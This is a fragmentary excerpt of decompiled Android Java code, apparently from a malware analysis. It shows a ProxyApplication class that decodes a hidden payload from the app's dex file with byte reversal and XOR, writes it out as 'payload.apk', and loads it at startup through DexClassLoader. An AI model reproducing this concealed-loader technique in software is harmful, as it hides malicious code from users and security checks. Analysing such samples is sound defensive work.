...
public class ProxyApplication extends Application {
   ...
   private byte[] jgsyagjwnbas(byte[] var1) {
      for(int var3 = 0; var3 < var1.length; ++var3) {
         byte var2 = var1[var3];
         var1[var3] = var1[var1.length - var3 - 1];
         var1[var1.length - var3 - 1] = var2;
         var1[var3] = (byte)(var1[var3] ^ 255);
      }
   ...
   private void splitPayLoadFromDex(byte[] var1) throws IOException {
      ...
      File var8 = new File(this.JhhYdeaasKk);
   ...
   protected void attachBaseContext(Context var1) {
      ...
      try {
         ...
         this.JhhYdeaasKk = var5.getAbsolutePath() + "/payload.apk";
         var5 = new File(this.JhhYdeaasKk);
         if(!var5.exists()) {
            var5.createNewFile();
         ...
         var9 = new DexClassLoader(this.JhhYdeaasKk, this.UUybjNNbf, this.jUHJJGTDSpLKD, (ClassLoader)RefInvoke.getFieldOjbect("android.app.LoadedApk", var8.get(), "mClassLoader"));
